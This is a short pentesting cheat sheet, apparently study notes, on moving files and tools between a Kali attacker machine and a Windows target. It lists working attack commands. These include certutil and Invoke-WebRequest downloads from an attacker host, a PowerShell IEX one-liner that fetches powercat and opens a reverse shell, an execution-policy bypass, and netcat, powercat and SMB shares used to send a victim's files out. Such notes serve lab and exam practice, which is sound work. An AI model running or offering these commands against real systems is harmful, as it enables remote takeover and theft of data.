
#### CMD

`certutil -urlcache -split -f "http://ip/file" file` - download remote file from attacker

`powershell -FILE "file.ps1"` - execute file from cmd using powershell.

`powershell -ExecutionPolicy Bypass -File "C:\Scripts\MyScript.ps1"` - attempt to bypass execution policy and execute script.

`nc.exe -nvlp 7777 < file to sent to kali`

#### PowerShell

methods used to download powercat.ps1 from attacker:

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://ip/powercat.ps1","C:\path\powercat.ps1")
```

`nc -lnvp 443 > notes.txt` - run on attacking machine

`powercat -c 192.168.1.3 -p 443 -i notes.txt` - run on target machine to transfer files

`iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe` - shorthand for Invoke-WebRequest, downloads file from remote server

### Kali

`smbclient //192.168.223.195/share -c 'put config.Library-ms'` - transfer file via smbclient from kali to windows share.

##### host smb server on kali

1. `impacket-smbserver <share> $(pwd) -smb2support -user kali -password kali` host smb server on kali machine - USE ROOT TERMINAL

2. `net use \\kali-ip\<share> /u:username password` - use share on windows machine - this allows the windows machine to interact with the share on the kali box

3. `copy file.txt \\kali-ip\share\file.txt` - send file to kali smb share from windows poweshell/cmd

##### host apache2 webserver

`sudo systemctl start apache2` - start apache webserver

`sudo cp /file/to/share /var/www/html/` - host the file

